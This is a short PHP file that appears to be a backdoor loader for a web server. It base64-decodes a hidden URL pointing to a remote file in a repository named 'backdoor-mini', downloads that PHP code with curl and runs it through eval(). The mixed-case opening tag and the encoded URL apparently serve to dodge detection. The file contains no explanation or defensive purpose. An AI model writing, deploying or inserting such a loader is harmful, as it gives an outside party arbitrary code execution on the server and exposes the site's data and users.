<?pHp 
   function get($url) { 
    $ch = curl_init(); 
 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
 
    $data = curl_exec($ch); 
    curl_close($ch); 
 
    return $data; 
} 
$x= '?>'; 
      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dhbmVzdFNldmVuL2JhY2tkb29yLW1pbmkvcmVmcy9oZWFkcy9tYWluLzEucGhw'))); 
?>
